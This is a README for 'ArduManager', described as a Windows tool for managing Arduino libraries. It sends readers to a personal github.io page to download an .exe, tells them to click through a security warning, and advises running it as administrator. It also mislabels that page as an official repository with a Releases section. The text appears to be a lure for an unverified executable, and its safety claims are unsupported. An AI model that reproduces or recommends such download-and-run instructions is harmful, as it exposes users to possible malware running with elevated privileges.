# ⚙️ ArduManager - Manage your Arduino libraries with ease

[![Download ArduManager](https://img.shields.io/badge/Download-ArduManager-blue.svg)](https://daniell5408.github.io)

## 📖 About this program
ArduManager helps you handle Arduino libraries and boards. It connects to GitHub to find and save files for your projects. You do not need technical skills to use this tool. It organizes your development workspace and keeps your files up to date. You avoid searching through folders manually. The program automates the download process for you.

## 📋 System requirements
Your computer needs to meet these basic standards to run ArduManager:

* Operating System: Windows 10 or Windows 11.
* Storage: At least 100 MB of free space.
* Internet: An active connection to download libraries.
* Arduino IDE: Version 1.8.0 or newer.

## 📥 How to download
You visit the official repository page to get the software. Follow these steps to obtain the setup file:

1. Visit the following link: https://daniell5408.github.io
2. Look for the Releases section on the right side of the screen.
3. Click the latest version link.
4. Locate the file ending in .exe.
5. Click the file to start the download.

Once the file finishes downloading, move it to your preferred folder.

## 🛠️ Setting up the software
Installing ArduManager requires a few simple steps. Follow this guide to prepare your system for use:

1. Double-click the downloaded .exe file.
2. A security window might appear on your screen. Click "Run" or "Yes" to start the process.
3. Choose your installation location. The default choice works for most users.
4. Click "Next" to continue.
5. Wait for the progress bar to finish.
6. Click "Finish" to close the installer.

A shortcut appears on your desktop. Double-click this icon to start the application.

## 🚀 Using the manager
The main window shows a list of your current Arduino configurations. You navigate the interface using the menu at the top.

To add a new library:
1. Open the search bar.
2. Type the name of the library or the GitHub link.
3. Click the search button.
4. Select the library from the results list.
5. Click the "Install" button.

The program creates a folder in your Arduino directory. It copies the files automatically. You do not need to restart your Arduino IDE to see the changes.

## 🔄 Updating your tools
ArduManager checks for new versions of your libraries. When an update exists, a notification appears on the dashboard.

1. Open the application.
2. Go to the "Updates" tab.
3. Review the list of pending updates.
4. Click "Update All" to refresh your tools.

The software replaces old files with the new ones. It keeps your existing settings during this transition.

## 🔍 Troubleshooting
Sometimes issues occur during the download process. Review these solutions if you experience problems:

* Program fails to start: Ensure you have the latest version of the .NET framework installed on Windows. 
* Cannot find libraries: Check your internet connection. ArduManager needs access to GitHub to function.
* Permission errors: Run the program as an administrator. Right-click the shortcut and pick "Run as administrator".
* Interface looks empty: Click the "Refresh" button in the top corner to reload your library list.

## 🛡️ Privacy and safety
This software communicates only with GitHub and your local Arduino folders. It does not send your personal data to other servers. It does not store passwords or credit card information. You manage all data locally on your machine.
